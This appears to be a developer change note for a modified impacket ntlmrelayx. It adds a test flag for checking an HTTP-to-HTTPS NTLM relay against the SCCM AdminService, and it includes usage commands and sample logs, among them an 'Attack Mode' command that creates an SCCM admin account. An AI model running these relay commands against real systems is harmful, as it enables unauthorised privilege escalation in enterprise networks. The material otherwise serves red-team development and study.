# AdminService Test Mode

## Overview

Added `--test-adminservice` flag to ntlmrelayx that allows testing SCCM AdminService authentication without performing the actual attack.

## Purpose

When developing/testing the HTTP->HTTPS local authentication bypass, you need to verify that:
1. The Type 3 AUTHENTICATE token is being relayed correctly
2. The authentication succeeds on the HTTPS endpoint
3. The exploit works repeatedly (not just once)

The standard `--adminservice` attack only runs once per user and then adds them to the ELEVATED list, preventing repeat testing.

## Changes Made

### 1. New Command-Line Flag
**File:** `examples/ntlmrelayx.py`
- Added `--test-adminservice` flag to AdminService options group

### 2. Configuration
**File:** `impacket/examples/ntlmrelayx/utils/config.py`
- Added `setTestAdminService()` method
- Added `testAdminService` config variable

### 3. Enhanced Logging
**File:** `impacket/examples/ntlmrelayx/servers/httprelayserver.py`
- When AdminService attack is triggered, logs detailed Type 3 information:
  - Source IP
  - Authorization header
  - User-Agent
  - Domain/Username/Workstation
  - NTLM flags
  - Detects and highlights local auth (empty credentials)

### 4. Test Mode Logic
**File:** `impacket/examples/ntlmrelayx/attacks/httpattacks/adminserviceattack.py`

#### When `--test-adminservice` is enabled:
- Skips ELEVATED list check (allows repeat testing)
- Sends GET request instead of POST
- Does NOT attempt to add an admin user
- Logs full HTTP response:
  - Status code and reason
  - All response headers
  - Complete response body
- Interprets results:
  - 200 OK = Authentication SUCCESS
  - 401 Unauthorized = Authentication FAILED  
  - 403 Forbidden = Auth succeeded, insufficient perms
  - 500 Internal Error = Auth succeeded, malformed request

#### When `--test-adminservice` is NOT enabled (normal mode):
- Works exactly as before
- Performs actual attack (POST to create admin)
- Adds user to ELEVATED list after first success

## Usage

### Test Mode (Authentication Only)
```bash
# Basic test
sudo python3 examples/ntlmrelayx.py -t https://sccm-sitesrv1 \
  --adminservice --test-adminservice \
  --remove-mic-partial --try-local

# Verbose test with debug output
sudo python3 examples/ntlmrelayx.py -t https://sccm-sitesrv1 \
  --adminservice --test-adminservice \
  --remove-mic-partial --try-local -debug
```

### Attack Mode (Actual Exploitation)
```bash
sudo python3 examples/ntlmrelayx.py -t https://sccm-sitesrv1 \
  --adminservice \
  --logonname 'DOMAIN\user' \
  --displayname 'Pwned User' \
  --objectsid 'S-1-5-21-...' \
  --remove-mic-partial --try-local
```

## Example Output

### Test Mode Success
```
[*] Received AUTHENTICATE message from 10.14.10.10
[*] Parsed authenticate message, user: , flags: 0x...
[*] === Received Type 3 AUTHENTICATE from Client ===
[*] Source: HTTP client 10.14.10.10
[*] Authorization header: Negotiate TlRMTVNTUAAD...
[*] Domain: 
[*] Username: 
[*] Workstation: SCCM-SITESRV
[*] NTLM Flags: 0x...
[*] ** This is LOCAL AUTH (empty domain/username) **
[*] ** Client is authenticating as its machine account **
[*] === End Client Type 3 ===
[*] Testing AdminService authentication (test mode - no attack)...
[*] === AdminService Authentication Test Result ===
[*] HTTP Status: 200 OK
[*] Response Headers:
[*]   Content-Type: application/json
[*]   Content-Length: 1234
[*] Response Body (1234 bytes):
{"value":[...]}
[*] [+] SUCCESS: Authentication accepted (200 OK)
[*] === End Test Result ===
```

### Test Mode Failure
```
[*] HTTP Status: 401 Unauthorized
[*] Response Headers:
[*]   WWW-Authenticate: Negotiate
[*] [-] FAILED: Authentication rejected (401 Unauthorized)
```

## Benefits

1. **Repeatable Testing**: Test authentication repeatedly without attack side effects
2. **Quick Validation**: Verify exploit works before running actual attack
3. **Debugging**: Full response details help diagnose issues
4. **Safe Development**: Test changes without creating admin accounts
5. **Attack Verification**: Confirm Type 3 relay succeeds before exploitation

## Related Flags

This is typically used with:
- `--remove-mic-partial`: Strip SIGN/SEAL flags for HTTP->HTTPS relay
- `--try-local`: Enable HTTP local NTLM authentication 
- `-debug`: Show verbose logging including token details
